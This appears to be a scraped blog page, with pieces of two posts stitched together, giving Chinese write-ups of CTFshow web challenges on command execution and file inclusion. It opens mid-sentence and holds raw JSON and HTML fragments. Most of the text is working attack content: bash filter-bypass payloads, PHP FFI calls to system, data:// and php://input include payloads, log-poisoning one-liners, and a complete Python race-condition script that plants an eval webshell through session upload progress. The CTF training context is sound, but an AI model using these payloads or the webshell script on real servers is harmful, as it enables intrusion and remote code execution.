Interface）是 PHP 7.4 及以上版本引入的一个强大功能。它允许 PHP 代码直接调用 C 语言函数，从而实现了 PHP 与 C 语言的高效交互。这为 PHP 开发者提供了一种利用 C 语言的高性能和底层操作系统功能的方式。\npayload:\n$ffi = FFI::cdef(\u0026#34;int system(const char *command);\u0026#34;);//创建一个system对象\r$a=\u0026#39;/readflag \u0026gt; 1.txt\u0026#39;;//没有回显的\r$ffi-\u0026gt;system($a);//通过$ffi去调用system函数 通过执行目录中的 /readflag 程序并将其输出重定向到文件 1.txt中（因为只是执行的话没有回显）\n执行一下\n看到有回显应该是成功了，访问一下1.txt\n由于当前用户权限不足我们是不能直接读flag36x.php文件中的内容的，只能通过readflag（脚本里面会进行提权）来读\nweb118 原文地址：https://blog.csdn.net/Myon5/article/details/140145005\n输入数字和小写字母，回显 evil input\n查看源码，发现这里会将提交的参数 code 传给 system 函数\n使用 burpsuite 抓包进行单个字符的模糊测试 fuzz：\n发现过滤掉了数字和小写字母以及一些符号，下面框起来的部分是可用的\n结合题目提示：flag 在 flag.php\n那么我们就需要构造出命令去读取 flag.php\n我们先来了解一下 Linux 的内置变量 在 Linux 系统中，有许多内置变量（环境变量）用于配置系统行为和存储系统信息。\n（1）$BASH\n描述：指向当前使用的Bash解释器的路径。 示例：/bin/bash 用途：用于确定正在使用的Bash版本和路径。\n（2） $PATH\n描述：存储一系列路径，这些路径用于查找可执行文件，当你在命令行中输入命令时，系统会在这些路径中查找对应的可执行文件。 示例：/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 用途：影响命令的查找和执行，可以添加自定义脚本或程序的路径。\n（3）$HOME\n描述：当前用户的主目录路径。 示例：/home/username 用途：表示当前用户的主目录，通常用于存储用户配置文件和个人数据。\n（4）$PWD\n描述：当前工作目录（Present Working Directory）。 示例：/home/username/projects 用途：表示当前的工作目录路径，常用于脚本和命令中获取或显示当前目录。\n（5）$USER\n描述：当前登录的用户名。 示例：username 用途：表示当前用户的名称，常用于显示或检查用户信息。\n（6）$SHELL\n描述：当前用户的默认shell。 示例：/bin/bash 用途：表示用户登录时使用的默认shell路径。\n（7）$UID\n描述：当前用户的用户ID。 示例：1000（普通用户），0（root用户） 用途：标识当前用户的唯一ID。\n（8）$IFS\n描述：内部字段分隔符（Internal Field Separator），用于分割输入的字段，默认为空格、制表符和换行符。 示例：默认值为 用途：影响脚本中的字段分割，常用于处理输入和解析文本。\n此外还有很多的内置变量：\n接下来我们需要知道 Bash 变量的切片，与 python 的切片类似，目的还是从指定位置开始提取子字符串，用法：${VAR:offset:length}，看例子：\n${PWD:1:2} 提取从第二个字符开始的两个字符，即 ro，在 Bash 中，字符串切片的索引也是从 0 开始的。\n如果只填一个参数，会默认从指定的位置开始提取到字符串的末尾：\n${PWD:3} 简单测一下我们就可以看出波浪号的效果：从结尾开始取\n但是这里数字被过滤了，因此我们使用大写字母绕过：\n可以发现任意的大小写字母与数字 0 等效\n不难想到这里的 $PWD 应该是 /var/www/html（网页服务所在的常见路径）；\n而 $PATH 的结尾应该也是 /bin（这个在前面我们已经测试过了）。\n因此我们可以构造出 nl 命令来读取 flag.php，由于 ? 可用，因此我们可以进行通配，绕过字母的过滤，构造 payload：\n${PATH:~Q}${PWD:~Q} ????.??? 当然题目还给了其他 payload：\n${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}} ?${PATH:${#RANDOM}:${#SHLVL}}??.??? 在Bash中，${#var} 的语法用于获取变量 var 的长度（即字符数）。\n这种形式可以应用于任何变量，无论是字符串变量还是环境变量。\n我们知道 ${HOME} 是 /root，因此 ${#HOME} 就是 5。\n以此类推，最终将这些数字应用到切片中去，绕过对数字的过滤，构造出我们想要执行的命令。\nWeb119 先用上一题的payload打了一下，显示evil input\n测了一下上题用的PATH被ban了\n换个方法\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???\r相当于/???/??t ????.???\r匹配/bin/cat ????.??? ${#SHLVL}}=1\n${PWD::${#SHLVL}} = /\n${#HOSTNAME}=4 //用户名的位数，这里用户名是root，故为4\n另一种方法\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???\r相当于/???/?????4 ????.??? 或者 /???/?????5 ????.???\r想要匹配/bin/base64 ????.??? {#RANDOM} = 4或5\n由于可能是5，所以要多试几次，还要进行base64解码\nweb120 1 2\u0026lt;?php 3error_reporting(0); 4highlight_file(__FILE__); 5if(isset($_POST[\u0026#39;code\u0026#39;])){ 6 $code=$_POST[\u0026#39;code\u0026#39;]; 7 if(!preg_match(\u0026#39;/\\x09|\\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\=|\\^|\\*|\\x26|\\%|\\\u0026lt;|\\\u0026gt;|\\\u0026#39;|\\\u0026#34;|\\`|\\||\\,/\u0026#39;, $code)){ 8 if(strlen($code)\u0026gt;65){ 9 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.\u0026#39;you are so long , I dont like \u0026#39;.\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 10 } 11 else{ 12 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.system($code).\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 13 } 14 } 15 else{ 16 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;evil input\u0026lt;/div\u0026gt;\u0026#39;; 17 } 18} 19 20?\u0026gt; 这题把上题的HOME也ban了，但是第二种方法还能出，而且长度也符合\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.??? 或\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.??? web121 1 2\u0026lt;?php 3error_reporting(0); 4highlight_file(__FILE__); 5if(isset($_POST[\u0026#39;code\u0026#39;])){ 6 $code=$_POST[\u0026#39;code\u0026#39;]; 7 if(!preg_match(\u0026#39;/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|\\%|\\\u0026lt;|\\\u0026gt;|\\\u0026#39;|\\\u0026#34;|\\`|\\||\\,/\u0026#39;, $code)){ 8 if(strlen($code)\u0026gt;65){ 9 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.\u0026#39;you are so long , I dont like \u0026#39;.\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 10 } 11 else{ 12 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.system($code).\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 13 } 14 } 15 else{ 16 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;evil input\u0026lt;/div\u0026gt;\u0026#39;; 17 } 18} 19 20?\u0026gt; 这题SHLVL被ban了，可以用?代替\n${#?}=1\npayload\n${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.??? 或\n${PWD::${#?}}???${PWD::${#?}}${PWD::${#?}}?? ????.???\r/bin/rev rev是倒叙输出的\nweb122 1 2\u0026lt;?php 3error_reporting(0); 4highlight_file(__FILE__); 5if(isset($_POST[\u0026#39;code\u0026#39;])){ 6 $code=$_POST[\u0026#39;code\u0026#39;]; 7 if(!preg_match(\u0026#39;/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|#|%|\\\u0026gt;|\\\u0026#39;|\\\u0026#34;|\\`|\\||\\,/\u0026#39;, $code)){ 8 if(strlen($code)\u0026gt;65){ 9 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.\u0026#39;you are so long , I dont like \u0026#39;.\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 10 } 11 else{ 12 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.system($code).\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 13 } 14 } 15 else{ 16 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;evil input\u0026lt;/div\u0026gt;\u0026#39;; 17 } 18} 19 20?\u0026gt; 这题把PWD和#也ban掉了\n可以考虑用$?来代替${#1}\n$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误\n所以我们可以构造payload:\n\u0026lt;A;${HOME::$?}???${HOME::$?}????${RANDOM::$?}? ????.??? \u0026lt;A指令不知道是啥，埋个坑\nweb124 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: 收集自网络 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-06 14:04:45 9 10*/ 11 12error_reporting(0); 13//听说你很喜欢数学，不知道你是否爱它胜过爱flag 14if(!isset($_GET[\u0026#39;c\u0026#39;])){ 15 show_source(__FILE__); 16}else{ 17 //例子 c=20-1 18 $content = $_GET[\u0026#39;c\u0026#39;]; 19 if (strlen($content) \u0026gt;= 80) { 20 die(\u0026#34;太长了不会算\u0026#34;); 21 } 22 $blacklist = [\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\n\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;\\[\u0026#39;, \u0026#39;\\]\u0026#39;]; 23 foreach ($blacklist as $blackitem) { 24 if (preg_match(\u0026#39;/\u0026#39; . $blackitem . \u0026#39;/m\u0026#39;, $content)) { 25 die(\u0026#34;请不要输入奇奇怪怪的字符\u0026#34;); 26 } 27 } 28 //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp 29 $whitelist = [\u0026#39;abs\u0026#39;, \u0026#39;acos\u0026#39;, \u0026#39;acosh\u0026#39;, \u0026#39;asin\u0026#39;, \u0026#39;asinh\u0026#39;, \u0026#39;atan2\u0026#39;, \u0026#39;atan\u0026#39;, \u0026#39;atanh\u0026#39;, \u0026#39;base_convert\u0026#39;, \u0026#39;bindec\u0026#39;, \u0026#39;ceil\u0026#39;, \u0026#39;cos\u0026#39;, \u0026#39;cosh\u0026#39;, \u0026#39;decbin\u0026#39;, \u0026#39;dechex\u0026#39;, \u0026#39;decoct\u0026#39;, \u0026#39;deg2rad\u0026#39;, \u0026#39;exp\u0026#39;, \u0026#39;expm1\u0026#39;, \u0026#39;floor\u0026#39;, \u0026#39;fmod\u0026#39;, \u0026#39;getrandmax\u0026#39;, \u0026#39;hexdec\u0026#39;, \u0026#39;hypot\u0026#39;, \u0026#39;is_finite\u0026#39;, \u0026#39;is_infinite\u0026#39;, \u0026#39;is_nan\u0026#39;, \u0026#39;lcg_value\u0026#39;, \u0026#39;log10\u0026#39;, \u0026#39;log1p\u0026#39;, \u0026#39;log\u0026#39;, \u0026#39;max\u0026#39;, \u0026#39;min\u0026#39;, \u0026#39;mt_getrandmax\u0026#39;, \u0026#39;mt_rand\u0026#39;, \u0026#39;mt_srand\u0026#39;, \u0026#39;octdec\u0026#39;, \u0026#39;pi\u0026#39;, \u0026#39;pow\u0026#39;, \u0026#39;rad2deg\u0026#39;, \u0026#39;rand\u0026#39;, \u0026#39;round\u0026#39;, \u0026#39;sin\u0026#39;, \u0026#39;sinh\u0026#39;, \u0026#39;sqrt\u0026#39;, \u0026#39;srand\u0026#39;, \u0026#39;tan\u0026#39;, \u0026#39;tanh\u0026#39;]; 30 preg_match_all(\u0026#39;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/\u0026#39;, $content, $used_funcs); 31 foreach ($used_funcs[0] as $func) { 32 if (!in_array($func, $whitelist)) { 33 die(\u0026#34;请不要输入奇奇怪怪的函数\u0026#34;); 34 } 35 } 36 //帮你算出答案 37 eval(\u0026#39;echo \u0026#39;.$content.\u0026#39;;\u0026#39;); 38} 这题设置了白名单和黑名单，白名单是数学函数，黑名单则是一些符号，而且有长度限制\n这题的思路其实就是要考虑用数字通过数学运算函数的转换来构造出我们需要用到的字符\n就比如我们可以先将需要的字符转换成16进制后再转换成10进制，再执行命令的时候通过数学函数转换回去\nCTFshow-WEB入门-命令执行web124 - Hacker\u0026amp;Cat - 博客园\n目标代码：$_GET[\u0026#39;abs\u0026#39;]($_GET[\u0026#39;acos\u0026#39;]) dechex()，10进制转16进制\rbase_convert(值,原进制,目标进制)，任意进制转换\rhex2bin，16进制转字符串 解题：\nbase_convert(26941962055,10,34) 为 hex2bin\nbase_convert(26941962055,10,34)(dechex(1598506324)) 为 _GET\n构造payload\nc=$pi=base_convert(26941962055,10,34)(dechex(1598506324));$$pi{abs}($$pi{asin})\u0026amp;abs=system\u0026amp;asin=ls ","permalink":"http://localhost:1313/post/ctfshow/ctfshow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","summary":"\u003ch4 id=\"web29\"\u003eweb29\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 1\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 2\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 3\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 4\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e# -*- coding: utf-8 -*-\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 5\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e# @Author: h1xa\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 6\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e# @Date:   2020-09-04 00:12:34\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 7\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e# @Last Modified by:   h1xa\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 8\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e# @Last Modified time: 2020-09-04 00:26:48\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 9\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e# @email: h1xa@ctfer.com\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e10\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e# @link: https://ctfer.com\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e11\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e12\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e*/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e13\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e14\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003eerror_reporting\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e15\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eisset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;c\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e])){\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e16\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$c\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;c\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e17\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003epreg_match\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/flag/i\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$c\u003c/span\u003e\u003cspan class=\"p\"\u003e)){\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e18\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eeval\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$c\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e19\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e20\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e21\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"k\"\u003eelse\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e22\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nx\"\u003ehighlight_file\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"no\"\u003e__FILE__\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e23\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e可以看到通过eval函数可以执行php代码或者系统命令，其中过滤了flag。\u003c/p\u003e","title":"CTFSHOW-命令执行-Writeup"},{"content":" 以PHP为例,常用的文件包含函数有以下四种include(),require(),include_once(),require_once()\nWeb78 php伪协议\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 10:52:43 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-16 10:54:20 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;file\u0026#39;])){ 16 $file = $_GET[\u0026#39;file\u0026#39;]; 17 include($file); 18}else{ 19 highlight_file(__FILE__); 20} payload:\n?file=data://text/plain,\u003c?php system(\"cat flag.php\")?\u003e\n查看源代码，得到flag\nweb79 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:10:14 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-16 11:12:38 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;file\u0026#39;])){ 16 $file = $_GET[\u0026#39;file\u0026#39;]; 17 $file = str_replace(\u0026#34;php\u0026#34;, \u0026#34;???\u0026#34;, $file); 18 include($file); 19}else{ 20 highlight_file(__FILE__); 21} 这题相对于上一题会将file中的php替换为???\n我们可以通过base64进行绕过\n?file=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4= or\n?file=data://text/plain,\u0026lt;?=system(\u0026#39;tac flag*\u0026#39;);?\u0026gt; ?file=data://text/plain,\u0026lt;?Php echo `tac f*`;?\u0026gt; or\n远程加载\n加载robots.txt，发现可以回显\n在自己vps上创建1.txt，内容如下 \u0026lt;?php system(\u0026quot;tac flag.php\u0026quot;);?\u0026gt;\n起一个http服务，加载 url/?file=http://x.x.x.x:7001/1.txt\nor\ninput协议 大小写绕过\npayload:\nPOST /?file=Php://input HTTP/1.1\r\u0026lt;?Php system(\u0026#34;cat flag.php\u0026#34;);?\u0026gt; web80 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-16 11:26:29 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;file\u0026#39;])){ 16 $file = $_GET[\u0026#39;file\u0026#39;]; 17 $file = str_replace(\u0026#34;php\u0026#34;, \u0026#34;???\u0026#34;, $file); 18 $file = str_replace(\u0026#34;data\u0026#34;, \u0026#34;???\u0026#34;, $file); 19 include($file); 20}else{ 21 highlight_file(__FILE__); 22} 日志包含\n写入一句话木马\n连webshell工具或者直接get传参\n?file=/var/log/nginx/access.log\u0026amp;2=system(\u0026#39;ls /var/www/html\u0026#39;);phpinfo();\r?file=/var/log/nginx/access.log\u0026amp;2=system(\u0026#39;tac /var/www/html/fl0g.php\u0026#39;);phpinfo(); Or\ninput协议 大小写绕过\npayload:\nPOST /?file=Php://input HTTP/1.1\r\u0026lt;?Php system(\u0026#34;cat flag.php\u0026#34;);?\u0026gt; web81 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-16 15:51:31 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13if(isset($_GET[\u0026#39;file\u0026#39;])){ 14 $file = $_GET[\u0026#39;file\u0026#39;]; 15 $file = str_replace(\u0026#34;php\u0026#34;, \u0026#34;???\u0026#34;, $file); 16 $file = str_replace(\u0026#34;data\u0026#34;, \u0026#34;???\u0026#34;, $file); 17 $file = str_replace(\u0026#34;:\u0026#34;, \u0026#34;???\u0026#34;, $file); 18 include($file); 19}else{ 20 highlight_file(__FILE__); 21} 同上web80\nweb82 条件竞争\npoc\n1import requests 2import io 3import threading 4 5url=\u0026#39;http://9a77fcb3-6f3c-4bd6-a247-07bfe6766509.challenge.ctf.show:8080/\u0026#39; 6sessionid=\u0026#39;ctfshow\u0026#39; 7data={ 8\t\u0026#34;1\u0026#34;:\u0026#34;file_put_contents(\u0026#39;/var/www/html/jiuzhen.php\u0026#39;,\u0026#39;\u0026lt;?php eval($_POST[3]);?\u0026gt;\u0026#39;);\u0026#34; 9} 10#这个是访问/tmp/sess_ctfshow时，post传递的内容，是在网站目录下写入一句话木马。这样一旦访问成功，就可以蚁剑连接了。 11def write(session):#/tmp/sess_ctfshow中写入一句话木马。 12\tfileBytes = io.BytesIO(b\u0026#39;a\u0026#39;*1024*50) 13\twhile True: 14\tresponse=session.post(url, 15\tdata={ 16\t\u0026#39;PHP_SESSION_UPLOAD_PROGRESS\u0026#39;:\u0026#39;\u0026lt;?php eval($_POST[1]);?\u0026gt;\u0026#39; 17\t}, 18\tcookies={ 19\t\u0026#39;PHPSESSID\u0026#39;:sessionid 20\t}, 21\tfiles={ 22\t\u0026#39;file\u0026#39;:(\u0026#39;ctfshow.jpg\u0026#39;,fileBytes) 23\t} 24\t) 25 26def read(session):#访问/tmp/sess_ctfshow，post传递信息，在网站目录下写入木马。 27\twhile True: 28\tresponse=session.post(url+\u0026#39;?file=/tmp/sess_\u0026#39;+sessionid,data=data, 29\tcookies={ 30\t\u0026#39;PHPSESSID\u0026#39;:sessionid 31\t} 32\t) 33\tresposne2=session.get(url+\u0026#39;jiuzhen.php\u0026#39;);#访问木马文件，如果访问到了就代表竞争成功 34\tif resposne2.status_code==200:了 35\tprint(\u0026#39;++++++done++++++\u0026#39;) 36\telse: 37\tprint(resposne2.status_code) 38 39if __name__ == \u0026#39;__main__\u0026#39;: 40 41\tevnet=threading.Event() 42\t#写入和访问分别设置5个线程。 43\twith requests.session() as session: 44\tfor i in range(5): 45\tthreading.Thread(target=write,args=(session,)).start() 46\tfor i in range(5): 47\tthreading.Thread(target=read,args=(session,)).start() 48 49\tevnet.set() getshell\n直接查flag\n利用条件\n存在文件包含漏洞 知道session文件存放路径，可以尝试默认路径 具有读取和写入session文件的权限 这两个脚本理论上适用于web82-web86\nweb83 web83的开篇设置了session_unset();session_destroy();\nsession_unset()：释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件以及不释放对应的。 session_destroy()：删除当前用户对应的session文件以及释放sessionid，内存中的$_SESSION变量内容依然保留。\n就是释放和清除了前面所有session变量和文件，但是我们的解题思路是竞争上传那一瞬间创建的session，所以不影响。\nweb84 加上了一个system(rm -rf /tmp/*);，但是因为本来session.upload_progress.cleanup = on，就会清空对应session文件中的内容，这里加上删除，对竞争的影响不大。（但是可能需要增加一些线程）\nweb85 添加了一个内容识别，如果有\u0026lt;就die，依旧可以竞争。\nweb86 dirname(FILE)表示当前文件的绝对路径。set_include_path函数,是用来设置include的路径的，就是include()可以不提供文件的完整路径了。 include文件时,当包含路径既不是相对路径，也不是绝对路径时(如:include(“test.php”))，会先查找include_path所设置的目录。 脚本里用的是完整路径，不影响竞争。\nweb82-86：参考https://blog.csdn.net/m0_48780534/article/details/125410757\nweb87 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-16 21:57:55 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14if(isset($_GET[\u0026#39;file\u0026#39;])){ 15 $file = $_GET[\u0026#39;file\u0026#39;]; 16 $content = $_POST[\u0026#39;content\u0026#39;]; 17 $file = str_replace(\u0026#34;php\u0026#34;, \u0026#34;???\u0026#34;, $file); 18 $file = str_replace(\u0026#34;data\u0026#34;, \u0026#34;???\u0026#34;, $file); 19 $file = str_replace(\u0026#34;:\u0026#34;, \u0026#34;???\u0026#34;, $file); 20 $file = str_replace(\u0026#34;.\u0026#34;, \u0026#34;???\u0026#34;, $file); 21 file_put_contents(urldecode($file), \u0026#34;\u0026lt;?php die(\u0026#39;大佬别秀了\u0026#39;);?\u0026gt;\u0026#34;.$content); 22 23 24}else{ 25 highlight_file(__FILE__); 26} 使用 file_put_contents 函数将经过处理后的内容写入到文件中。写入的内容是先拼接了一个 \u0026lt;?php die('大佬别秀了');?\u0026gt; 字符串,用于在后续如果有人直接访问写入后的文件时，防止文件内容被直接执行而显示一些提示信息，然后再拼接上从 $_POST 中获取的 $content 变量的值。\n这道题需要用到php://filter\nphp://filter的使用 原文：谈一谈php://filter的妙用 | 